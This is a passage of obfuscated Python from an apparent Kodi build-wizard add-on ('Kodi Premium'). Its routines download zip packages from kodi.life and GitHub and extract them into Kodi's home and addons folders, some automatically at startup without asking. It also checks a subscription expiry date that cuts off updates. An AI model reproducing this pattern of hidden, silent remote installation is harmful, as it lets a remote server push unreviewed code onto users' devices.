    wiz .setS ("notedismiss3","true")#line:4171
    O0O0O0OOOO0OOOO0O ='http://kodi.life/movie/update_movie.xml'#line:4172
    OOO0O0O0O00O00000 =wiz .workingURL (O0O0O0OOOO0OOOO0O )#line:4173
    OO0OOOOO00OO000O0 =" Kodi Premium"#line:4175
    OO00O00O00O0OOOO0 ='http://kodi.life/movie/movie.zip'#line:4176
    O00OOOO0O0OO00000 =OO0OOOOO00OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4177
    if not wiz .workingURL (OO00O00O00O0OOOO0 )==True :return #line:4178
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4179
    try :#line:4180
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OOOOO00OO000O0 ),'','אנא המתן')#line:4181
    except :#line:4182
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד חבילת סרטים[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OOOOO00OO000O0 ))#line:4183
    O00OOOO0O00000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOOO0O0OO00000 )#line:4184
    if 'google'in OO00O00O00O0OOOO0 :#line:4187
       googledrive_download (OO00O00O00O0OOOO0 ,O00OOOO0O00000O00 ,DP ,wiz .checkBuild (OO0OOOOO00OO000O0 ,'updatesize'))#line:4188
    else :#line:4190
      downloader .download (OO00O00O00O0OOOO0 ,O00OOOO0O00000O00 ,DP )#line:4191
    xbmc .sleep (100 )#line:4192
    OOO00O00O00O0OOOO ='מעדכן סרטים'#line:4193
    OOO0O0O0O000OO0OO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O00O00O0OOOO )#line:4194
    try :#line:4195
        DP .update (0 ,OOO0O0O0O000OO0OO ,'','אנא המתן')#line:4196
    except :#line:4197
        DP .update (0 ,OOO0O0O0O000OO0OO +'\n'+''+'\n'+'אנא המתן')#line:4198
    extract .all (O00OOOO0O00000O00 ,HOME ,DP ,title =OOO0O0O0O000OO0OO )#line:4199
    try :os .remove (O00OOOO0O00000O00 )#line:4200
    except :pass #line:4201
    DP .close ()#line:4202
    if INSTALLMETHOD ==1 :O00OO000O0O000O00 =1 #line:4204
    elif INSTALLMETHOD ==2 :O00OO000O0O000O00 =0 #line:4205
    else :DP .close ()#line:4206
def checkidupdatetele (info =''):#line:4210
    OOO0OO0O00O00OO00 =wiz .workingURL (NOTIFICATION )#line:4211
    OOOO0OO0OOO000OO0 =" Kodi Premium"#line:4212
    O000OOO0OOO00O0OO =wiz .checkBuild (OOOO0OO0OOO000OO0 ,'gui')#line:4213
    O0O0OOO0OOO0OOOO0 =OOOO0OO0OOO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4214
    if not wiz .workingURL (O000OOO0OOO00O0OO )==True :return #line:4215
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4216
    OO00OOO00OO000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OOO0OOO0OOOO0 )#line:4217
    if 'google'in O000OOO0OOO00O0OO :#line:4220
       googledrive_download_BG (O000OOO0OOO00O0OO ,OO00OOO00OO000O00 ,DP2 ,wiz .checkBuild (OOOO0OO0OOO000OO0 ,'updatesize'))#line:4221
    else :#line:4222
      downloaderbg .download3 (O000OOO0OOO00O0OO ,OO00OOO00OO000O00 ,DP2 )#line:4223
    xbmc .sleep (100 )#line:4224
    DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:4225
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:4226
    extract .all2 (OO00OOO00OO000O00 ,HOME ,DP2 )#line:4227
    DP2 .close ()#line:4228
    wiz .kodi17Fix ()#line:4232
    wiz .setS ("notedismiss","true")#line:4237
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:4238
    try :os .remove (OO00OOO00OO000O00 )#line:4239
    except :pass #line:4240
    backup_setting_file ()#line:4241
    if wiz .getS ("dragon")=='true':#line:4242
      try :#line:4243
          open_dragon_menu_hub ()#line:4244
      except Exception as O000OOO0000O0000O :#line:4245
         logging .warning ('dragon hub errrrrrrror'+str (O000OOO0000O0000O ))#line:4246
    else :#line:4247
      try :#line:4248
          close_dragon_menu_hub ()#line:4249
      except Exception as O000OOO0000O0000O :#line:4250
         logging .warning ('dragon hub errrrrrrror'+str (O000OOO0000O0000O ))#line:4251
    if wiz .getS ('sex')=='false':#line:4252
        sex_menu_luck (notify ='false')#line:4253
    O0OOO0O00O00OOOO0 =[]#line:4258
    O0OOO0O00O00OOOO0 .append (Thread (indicatorfastupdate ,info ))#line:4259
    O0OOO0O00O00OOOO0 [0 ].start ()#line:4261
    xbmc .sleep (100 )#line:4263
    infobuild (True )#line:4264
def force_update ():#line:4269
    O0O0OO0OOOOO0OO0O =xbmcgui .Dialog ()#line:4270
    O000O00OO00O00O00 =O0O0OO0OOOOO0OO0O .yesno (ADDONTITLE ,"האם לבצע עדכון מערכת?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:4271
    if O000O00OO00O00O00 ==1 :#line:4272
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:4273
        OO0O0000O00OOO0O0 =wiz .getS ("date_user")#line:4274
        if not OO0O0000O00OOO0O0 =='':#line:4275
            import datetime #line:4276
            O0OOO000OOOOO0OOO =OO0O0000O00OOO0O0 .split ('.')#line:4277
            O0OOOOOOOOO0OO000 =datetime .date (int (O0OOO000OOOOO0OOO [2 ]),int (O0OOO000OOOOO0OOO [1 ]),int (O0OOO000OOOOO0OOO [0 ]))#line:4278
            if str (TODAY )>=str (O0OOOOOOOOO0OO000 ):#line:4279
             wiz .contact_wiz ('המערכת שלך יותר לא מקבלת עדכונים \nלחידוש יש לסרוק את הברקוד  \nאו לפנות לכתובת הזאת בטלגרם:\n[COLOR red]https://t.me/xbmc19[/COLOR]\n ')#line:4281
             sys .exit ()#line:4282
        if wiz .STARTP ()=='ok':#line:4283
            check ()#line:4284
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4285
            xbmc .executebuiltin ("ActivateWindow(home)")#line:4286
            O000000OO0O0OO0O0 ,O0O00O000OOOOO0OO =wiz .splitNotify (NOTIFICATION )#line:4287
            wiz .setS ('noteid',str (O000000OO0O0OO0O0 ))#line:4288
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוריד עדכון[/COLOR]"%COLOR2 )#line:4289
            checkidupdatetele ('ידני: ')#line:4290
    else :#line:4292
      sys .exit ()#line:4293
def clearPackagesStartup ():#line:4295
    O0OO0OO00OO000O00 =os .path .join (ADDONS ,'temp')#line:4296
    OOOOOO00OO0O0O000 =datetime .utcnow ()-timedelta (minutes =3 )#line:4297
    O0OO0O00OOOO00OO0 =0 ;O0OO0O00O0OOOOO00 =0 #line:4298
    if os .path .exists (PACKAGES ):#line:4299
        O000OOO000O00O0OO =os .listdir (PACKAGES )#line:4300
        O000OOO000O00O0OO .sort (key =lambda OO000O0O00OO0O0O0 :os .path .getmtime (os .path .join (PACKAGES ,OO000O0O00OO0O0O0 )))#line:4301
        for O00O00OOO00OO00O0 in O000OOO000O00O0OO :#line:4302
            OO0O0OOOO000O0000 =os .path .join (PACKAGES ,O00O00OOO00OO00O0 )#line:4303
            O00OOOO0O00O0OOO0 =datetime .utcfromtimestamp (os .path .getmtime (OO0O0OOOO000O0000 ))#line:4304
            if os .path .isfile (OO0O0OOOO000O0000 ):#line:4306
                O0OO0O00OOOO00OO0 +=1 #line:4307
                os .unlink (OO0O0OOOO000O0000 )#line:4309
            elif os .path .isdir (OO0O0OOOO000O0000 ):#line:4310
                try :#line:4314
                    shutil .rmtree (OO0O0OOOO000O0000 )#line:4315
                except :pass #line:4316
    if os .path .exists (O0OO0OO00OO000O00 ):#line:4317
        O000OOO000O00O0OO =os .listdir (O0OO0OO00OO000O00 )#line:4318
        O000OOO000O00O0OO .sort (key =lambda O0OO00OOOOOOOOO00 :os .path .getmtime (os .path .join (O0OO0OO00OO000O00 ,O0OO00OOOOOOOOO00 )))#line:4319
        for O00O00OOO00OO00O0 in O000OOO000O00O0OO :#line:4320
            OO0O0OOOO000O0000 =os .path .join (O0OO0OO00OO000O00 ,O00O00OOO00OO00O0 )#line:4321
            O00OOOO0O00O0OOO0 =datetime .utcfromtimestamp (os .path .getmtime (OO0O0OOOO000O0000 ))#line:4322
            if os .path .isfile (OO0O0OOOO000O0000 ):#line:4324
                O0OO0O00OOOO00OO0 +=1 #line:4325
                os .unlink (OO0O0OOOO000O0000 )#line:4327
            elif os .path .isdir (OO0O0OOOO000O0000 ):#line:4328
                try :#line:4332
                    shutil .rmtree (OO0O0OOOO000O0000 )#line:4333
                except :pass #line:4334
def auto_build_update (O000OO0O0O0OOO0O0 ):#line:4336
    xbmc .executebuiltin ("UpdateLocalAddons")#line:4337
    xbmc .executebuiltin ("UpdateAddonRepos")#line:4338
    try :#line:4340
        clearPackagesStartup ()#line:4341
    except :pass #line:4342
    if not xbmc .Player ().isPlaying ():#line:4343
        if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:4344
            wiz .wizardUpdate ('startup')#line:4345
            if wiz .STARTP ()=='ok':#line:4346
                if not NOTIFY =='true':#line:4348
                    OOO0O00O0OOO000OO ,OOOOO0OOO00O00OOO =wiz .splitNotify (NOTIFICATION )#line:4351
                    if not OOO0O00O0OOO000OO ==False :#line:4352
                        try :#line:4353
                            OOO0O00O0OOO000OO =int (OOO0O00O0OOO000OO );O000OO0O0O0OOO0O0 =int (O000OO0O0O0OOO0O0 )#line:4354
                            if OOO0O00O0OOO000OO ==O000OO0O0O0OOO0O0 :#line:4355
                                if NOTEDISMISS =='false':#line:4356
                                    checkidupdatetele ('אוטומטי: ')#line:4360
                                else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0O00O0OOO000OO ),5 )#line:4361
                            elif OOO0O00O0OOO000OO >O000OO0O0O0OOO0O0 :#line:4362
                                wiz .setS ('noteid',str (OOO0O00O0OOO000OO ))#line:4366
                                wiz .setS ('notedismiss','false')#line:4367
                                checkidupdatetele ('אוטומטי: ')#line:4368
                        except Exception as OO0O000O0O0OOO0OO :#line:4371
                            wiz .log ("Error on Notifications Window: %s"%str (OO0O000O0O0OOO0OO ),5 )#line:4372
def infomovie ():#line:4375
    O0000OO0OO0O00OO0 ='http://kodi.life/movie/update_movie.xml'#line:4376
    OO00OOOO0000OOO00 =wiz .workingURL (O0000OO0OO0O00OO0 )#line:4377
    if OO00OOOO0000OOO00 ==True :#line:4378
        try :#line:4379
            OO00000OO0O0OO0O0 ,O00OO000OO00O000O =wiz .splitNotify (O0000OO0OO0O00OO0 )#line:4380
            if OO00000OO0O0OO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4381
            if wiz .STARTP ()=='ok':#line:4382
                notify .update_movie (O00OO000OO00O000O ,True )#line:4383
        except Exception as OOO00O0O0O000O000 :#line:4384
            wiz .log ("Error on Notifications Window: %s"%str (OOO00O0O0O000O000 ),5 )#line:4385
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4386
def check_update_movie ():#line:4388
    OO00OOO00000OO000 ='http://kodi.life/movie/update_movie.xml'#line:4390
    OOOO0OOO00OO0O00O =wiz .workingURL (OO00OOO00000OO000 )#line:4391
    OOOO0O00O00O0OO00 =" Kodi Premium"#line:4392
    OO0000OOOO0OOOO0O ='http://kodi.life/movie/movie.zip'#line:4393
    OOOOO0O00OOOO0OO0 =OOOO0O00O00O0OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4394
    if not wiz .workingURL (OO0000OOOO0OOOO0O )==True :return #line:4395
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4396
    O0O0O000O00OO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO0O00OOOO0OO0 )#line:4398
    while xbmc .Player ().isPlaying ():#line:4399
        time .sleep (1 )#line:4400
    if 'google'in OO0000OOOO0OOOO0O :#line:4401
       googledrive_download_BG (OO0000OOOO0OOOO0O ,O0O0O000O00OO0O00 ,DP2 ,wiz .checkBuild (OOOO0O00O00O0OO00 ,'updatesize'))#line:4402
    else :#line:4404
      downloaderbg .download5 (OO0000OOOO0OOOO0O ,O0O0O000O00OO0O00 ,DP2 )#line:4405
    xbmc .sleep (100 )#line:4406
    DP2 .create ('[B][COLOR=green]מעדכן סרטים                         [/COLOR][/B]')#line:4408
    DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:4409
    extract .all2 (O0O0O000O00OO0O00 ,HOME ,DP2 )#line:4410
    DP2 .close ()#line:4411
    wiz .setS ("notedismiss3","true")#line:4412
    xbmc .sleep (100 )#line:4413
    try :os .remove (O0O0O000O00OO0O00 )#line:4416
    except :pass #line:4417
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=205&url=www)")#line:4418
def auto_movie_update (OOOOO0OO0OOOOO000 ):#line:4420
    OOOOO0OO0000OO000 ='http://kodi.life/movie/update_movie.xml'#line:4421
    if BUILDNAME ==" Kodi Premium"or os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:4422
        if wiz .STARTP ()=='ok':#line:4423
            if not NOTIFY3 =='true':#line:4424
                O000OO00O0O00O00O =wiz .workingURL (OOOOO0OO0000OO000 )#line:4425
                if O000OO00O0O00O00O ==True :#line:4426
                    O0OO0O0OOOOO0OOOO ,O000O000OO000OO00 =wiz .splitNotify (OOOOO0OO0000OO000 )#line:4427
                    if not O0OO0O0OOOOO0OOOO ==False :#line:4428
                        try :#line:4429
                            O0OO0O0OOOOO0OOOO =int (O0OO0O0OOOOO0OOOO );OOOOO0OO0OOOOO000 =int (OOOOO0OO0OOOOO000 )#line:4430
                            if O0OO0O0OOOOO0OOOO ==OOOOO0OO0OOOOO000 :#line:4431
                                if NOTEDISMISS3 =='false':#line:4432
                                    check_update_movie ()#line:4433
                            elif O0OO0O0OOOOO0OOOO >OOOOO0OO0OOOOO000 :#line:4434
                                wiz .setS ('noteid3',str (O0OO0O0OOOOO0OOOO ))#line:4436
                                wiz .setS ('notedismiss3','false')#line:4437
                                check_update_movie ()#line:4438
                        except Exception as OO00OO0000O0OOOOO :#line:4439
                            wiz .log ("Error on Notifications Window: %s"%str (OO00OO0000O0OOOOO ),5 )#line:4440
                    else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4441
                else :wiz .log ("[Notifications] URL(%s): %s"%(OOOOO0OO0000OO000 ,O000OO00O0O00O00O ),5 )#line:4442
            else :wiz .log ("[Notifications] Turned Off",5 )#line:4443
def auto_movie_firstbuild (OOO000000OO0O000O ):#line:4444
    OOO00000OO0OOO00O ='http://kodi.life/movie/update_movie.xml'#line:4445
    if wiz .STARTP ()=='ok':#line:4446
        if not NOTIFY3 =='true':#line:4447
            OOO0OOO0O000000O0 =wiz .workingURL (OOO00000OO0OOO00O )#line:4448
            if OOO0OOO0O000000O0 ==True :#line:4449
                OOO0000OOOOO0OO0O ,OO00O0O00000000OO =wiz .splitNotify (OOO00000OO0OOO00O )#line:4450
                if not OOO0000OOOOO0OO0O ==False :#line:4451
                    try :#line:4452
                        OOO0000OOOOO0OO0O =int (OOO0000OOOOO0OO0O );OOO000000OO0O000O =int (OOO000000OO0O000O )#line:4453
                        checkidupdate_movie ()#line:4454
                        wiz .setS ('notedismiss3','true')#line:4455
                        if OOO0000OOOOO0OO0O ==OOO000000OO0O000O :#line:4456
                            wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0000OOOOO0OO0O ),5 )#line:4457
                        elif OOO0000OOOOO0OO0O >OOO000000OO0O000O :#line:4458
                            wiz .setS ('noteid3',str (OOO0000OOOOO0OO0O ))#line:4460
                            wiz .setS ('notedismiss3','true')#line:4461
                    except Exception as O00OO0OO0000OO0OO :#line:4463
                        wiz .log ("Error on Notifications Window: %s"%str (O00OO0OO0000OO0OO ),5 )#line:4464
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4465
            else :wiz .log ("[Notifications] URL(%s): %s"%(OOO00000OO0OOO00O ,OOO0OOO0O000000O0 ),5 )#line:4466
        else :wiz .log ("[Notifications] Turned Off",5 )#line:4467
def auto_movie_firstbuild3 (OOOOOOOOO0O00O0OO ):#line:4468
    OOOOO0OOO00000O00 ='http://kodi.life/movie/update_movie.xml'#line:4469
    if wiz .STARTP ()=='ok':#line:4470
        if not NOTIFY3 =='true':#line:4471
            O0O00OO00O00OO000 =wiz .workingURL (OOOOO0OOO00000O00 )#line:4472
            if O0O00OO00O00OO000 ==True :#line:4473
                O0O0OOO0O0OOOO0OO ,OOOOO00000OO00OOO =wiz .splitNotify (OOOOO0OOO00000O00 )#line:4474
                if not O0O0OOO0O0OOOO0OO ==False :#line:4475
                    try :#line:4476
                        O0O0OOO0O0OOOO0OO =int (O0O0OOO0O0OOOO0OO );OOOOOOOOO0O00O0OO =int (OOOOOOOOO0O00O0OO )#line:4477
                        if O0O0OOO0O0OOOO0OO ==OOOOOOOOO0O00O0OO :#line:4478
                            if NOTEDISMISS3 =='false':#line:4479
                                checkidupdate_movie ()#line:4480
                        elif O0O0OOO0O0OOOO0OO >OOOOOOOOO0O00O0OO :#line:4481
                            wiz .setS ('noteid3',str (O0O0OOO0O0OOOO0OO ))#line:4483
                            wiz .setS ('notedismiss3','false')#line:4484
                            checkidupdate_movie ()#line:4485
                    except Exception as O000O0OO000000OOO :#line:4486
                        wiz .log ("Error on Notifications Window: %s"%str (O000O0OO000000OOO ),5 )#line:4487
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4488
            else :wiz .log ("[Notifications] URL(%s): %s"%(OOOOO0OOO00000O00 ,O0O00OO00O00OO000 ),5 )#line:4489
        else :wiz .log ("[Notifications] Turned Off",5 )#line:4490
def iptvkodi17_18 ():#line:4494
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:4497
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:4498
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4499
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 and KODIV <19 :#line:4503
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:4504
              O00000OO000O00000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:4506
              O0000O000O00OOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4507
              OO0OO00000OO0O0O0 =xbmcgui .DialogProgress ()#line:4508
              OO0OO00000OO0O0O0 .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:4509
              O0OO000OO0OOOO00O =os .path .join (O0000O000O00OOO00 ,'isr.zip')#line:4510
              OOO0O0O000000OO0O =Request (O00000OO000O00000 )#line:4511
              O0O00O0000OOOO000 =urlopen (OOO0O0O000000OO0O )#line:4512
              O0OOO000O0OO0OO00 =xbmcgui .DialogProgress ()#line:4514
              O0OOO000O0OO0OO00 .create ("Downloading","Downloading "+'iptv')#line:4515
              O0OOO000O0OO0OO00 .update (0 )#line:4516
              O0OO0OOO00000O0O0 =open (O0OO000OO0OOOO00O ,'wb')#line:4518
              try :#line:4520
                O00O0OOO0O00O00O0 =O0O00O0000OOOO000 .info ().getheader ('Content-Length').strip ()#line:4521
                OOOOOOO0O00O000O0 =True #line:4522
              except AttributeError :#line:4523
                    OOOOOOO0O00O000O0 =False #line:4524
              if OOOOOOO0O00O000O0 :#line:4526
                    O00O0OOO0O00O00O0 =int (O00O0OOO0O00O00O0 )#line:4527
              OOOO00OO00O000OO0 =0 #line:4529
              OO0O0O00O0OOOO00O =time .time ()#line:4530
              while True :#line:4531
                    OO0O00000OOOO0OO0 =O0O00O0000OOOO000 .read (8192 )#line:4532
                    if not OO0O00000OOOO0OO0 :#line:4533
                        sys .stdout .write ('\n')#line:4534
                        break #line:4535
                    OOOO00OO00O000OO0 +=len (OO0O00000OOOO0OO0 )#line:4537
                    O0OO0OOO00000O0O0 .write (OO0O00000OOOO0OO0 )#line:4538
                    if not OOOOOOO0O00O000O0 :#line:4540
                        O00O0OOO0O00O00O0 =OOOO00OO00O000OO0 #line:4541
                    if O0OOO000O0OO0OO00 .iscanceled ():#line:4542
                       O0OOO000O0OO0OO00 .close ()#line:4543
                       try :#line:4544
                        os .remove (O0OO000OO0OOOO00O )#line:4545
                       except :#line:4546
                        pass #line:4547
                       break #line:4548
                    O00O0000OO0000OO0 =float (OOOO00OO00O000OO0 )/O00O0OOO0O00O00O0 #line:4549
                    O00O0000OO0000OO0 =round (O00O0000OO0000OO0 *100 ,2 )#line:4550
                    OOOO0O0O000OOO000 =old_div (OOOO00OO00O000OO0 ,(1024 *1024 ))#line:4551
                    O000O0OO0O00000OO =old_div (O00O0OOO0O00O00O0 ,(1024 *1024 ))#line:4552
                    OOOO0OO0OOOO00O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0O0O000OOO000 ,'teal',O000O0OO0O00000OO )#line:4553
                    if (time .time ()-OO0O0O00O0OOOO00O )>0 :#line:4554
                      O0O000OOO0OOO0O00 =old_div (OOOO00OO00O000OO0 ,(time .time ()-OO0O0O00O0OOOO00O ))#line:4555
                      O0O000OOO0OOO0O00 =old_div (O0O000OOO0OOO0O00 ,1024 )#line:4556
                    else :#line:4557
                     O0O000OOO0OOO0O00 =0 #line:4558
                    OOO000000OO00OOO0 ='KB'#line:4559
                    if O0O000OOO0OOO0O00 >=1024 :#line:4560
                       O0O000OOO0OOO0O00 =old_div (O0O000OOO0OOO0O00 ,1024 )#line:4561
                       OOO000000OO00OOO0 ='MB'#line:4562
                    if O0O000OOO0OOO0O00 >0 and not O00O0000OO0000OO0 ==100 :#line:4563
                        O00O00000OO00O00O =old_div ((O00O0OOO0O00O00O0 -OOOO00OO00O000OO0 ),O0O000OOO0OOO0O00 )#line:4564
                    else :#line:4565
                        O00O00000OO00O00O =0 #line:4566
                    O0O000O0OO0O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O000OOO0OOO0O00 ,OOO000000OO00OOO0 )#line:4567
                    O0OOO000O0OO0OO00 .update (int (O00O0000OO0000OO0 ),"Downloading "+'iptv'+'\n'+OOOO0OO0OOOO00O00 +'\n'+O0O000O0OO0O0000O )#line:4569
              OOOOO0O00OOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4572
              O0OO0OOO00000O0O0 .close ()#line:4575
              extract .all (O0OO000OO0OOOO00O ,OOOOO0O00OOO000O0 ,O0OOO000O0OO0OO00 )#line:4576
              wiz .kodi17Fix ()#line:4578
              try :#line:4580
                os .remove (O0OO000OO0OOOO00O )#line:4581
              except :#line:4583
                pass #line:4584
              O0OOO000O0OO0OO00 .close ()#line:4585
              xbmc .sleep (5000 )#line:4587
              OOOO00OOOOO0OOO00 ='התקנת לקוח טלוויזיה חיה'#line:4589
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OOOOO0OOO00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:4590
              resetkodi ()#line:4591
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:4592
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 and KODIV <19 :#line:4593
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:4594
              O00000OO000O00000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:4595
              O0000O000O00OOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4596
              OO0OO00000OO0O0O0 =xbmcgui .DialogProgress ()#line:4597
              OO0OO00000OO0O0O0 .create ("XBMC ISRAEL","Downloading "+'iptv'+'\n'+''+'\n'+'Please Wait')#line:4598
              O0OO000OO0OOOO00O =os .path .join (O0000O000O00OOO00 ,'isr.zip')#line:4599
              OOO0O0O000000OO0O =Request (O00000OO000O00000 )#line:4600
              O0O00O0000OOOO000 =urlopen (OOO0O0O000000OO0O )#line:4601
              O0OOO000O0OO0OO00 =xbmcgui .DialogProgress ()#line:4603
              O0OOO000O0OO0OO00 .create ("Downloading","Downloading "+'iptv')#line:4604
              O0OOO000O0OO0OO00 .update (0 )#line:4605
              O0OO0OOO00000O0O0 =open (O0OO000OO0OOOO00O ,'wb')#line:4607
              try :#line:4609
                O00O0OOO0O00O00O0 =O0O00O0000OOOO000 .info ().getheader ('Content-Length').strip ()#line:4610
                OOOOOOO0O00O000O0 =True #line:4611
              except AttributeError :#line:4612
                    OOOOOOO0O00O000O0 =False #line:4613
              if OOOOOOO0O00O000O0 :#line:4615
                    O00O0OOO0O00O00O0 =int (O00O0OOO0O00O00O0 )#line:4616
              OOOO00OO00O000OO0 =0 #line:4618
              OO0O0O00O0OOOO00O =time .time ()#line:4619
              while True :#line:4620
                    OO0O00000OOOO0OO0 =O0O00O0000OOOO000 .read (8192 )#line:4621
                    if not OO0O00000OOOO0OO0 :#line:4622
                        sys .stdout .write ('\n')#line:4623
                        break #line:4624
                    OOOO00OO00O000OO0 +=len (OO0O00000OOOO0OO0 )#line:4626
                    O0OO0OOO00000O0O0 .write (OO0O00000OOOO0OO0 )#line:4627
                    if not OOOOOOO0O00O000O0 :#line:4629
                        O00O0OOO0O00O00O0 =OOOO00OO00O000OO0 #line:4630
                    if O0OOO000O0OO0OO00 .iscanceled ():#line:4631
                       O0OOO000O0OO0OO00 .close ()#line:4632
                       try :#line:4633
                        os .remove (O0OO000OO0OOOO00O )#line:4634
                       except :#line:4635
                        pass #line:4636
                       break #line:4637
                    O00O0000OO0000OO0 =float (OOOO00OO00O000OO0 )/O00O0OOO0O00O00O0 #line:4638
                    O00O0000OO0000OO0 =round (O00O0000OO0000OO0 *100 ,2 )#line:4639
                    OOOO0O0O000OOO000 =old_div (OOOO00OO00O000OO0 ,(1024 *1024 ))#line:4640
                    O000O0OO0O00000OO =old_div (O00O0OOO0O00O00O0 ,(1024 *1024 ))#line:4641
                    OOOO0OO0OOOO00O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0O0O000OOO000 ,'teal',O000O0OO0O00000OO )#line:4642
                    if (time .time ()-OO0O0O00O0OOOO00O )>0 :#line:4643
                      O0O000OOO0OOO0O00 =old_div (OOOO00OO00O000OO0 ,(time .time ()-OO0O0O00O0OOOO00O ))#line:4644
                      O0O000OOO0OOO0O00 =old_div (O0O000OOO0OOO0O00 ,1024 )#line:4645
                    else :#line:4646
                     O0O000OOO0OOO0O00 =0 #line:4647
                    OOO000000OO00OOO0 ='KB'#line:4648
                    if O0O000OOO0OOO0O00 >=1024 :#line:4649
                       O0O000OOO0OOO0O00 =old_div (O0O000OOO0OOO0O00 ,1024 )#line:4650
                       OOO000000OO00OOO0 ='MB'#line:4651
                    if O0O000OOO0OOO0O00 >0 and not O00O0000OO0000OO0 ==100 :#line:4652
                        O00O00000OO00O00O =old_div ((O00O0OOO0O00O00O0 -OOOO00OO00O000OO0 ),O0O000OOO0OOO0O00 )#line:4653
                    else :#line:4654
                        O00O00000OO00O00O =0 #line:4655
                    O0O000O0OO0O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O000OOO0OOO0O00 ,OOO000000OO00OOO0 )#line:4656
                    O0OOO000O0OO0OO00 .update (int (O00O0000OO0000OO0 ),"Downloading "+'iptv'+'\n'+OOOO0OO0OOOO00O00 +'\n'+O0O000O0OO0O0000O )#line:4658
              OOOOO0O00OOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4661
              O0OO0OOO00000O0O0 .close ()#line:4664
              extract .all (O0OO000OO0OOOO00O ,OOOOO0O00OOO000O0 ,O0OOO000O0OO0OO00 )#line:4665
              wiz .kodi17Fix ()#line:4666
              try :#line:4668
                os .remove (O0OO000OO0OOOO00O )#line:4669
              except :#line:4671
                pass #line:4672
              O0OOO000O0OO0OO00 .close ()#line:4673
              xbmc .sleep (5000 )#line:4675
              OOOO00OOOOO0OOO00 ='התקנת לקוח טלוויזיה חיה'#line:4677
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OOOOO0OOO00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:4678
              resetkodi ()#line:4679
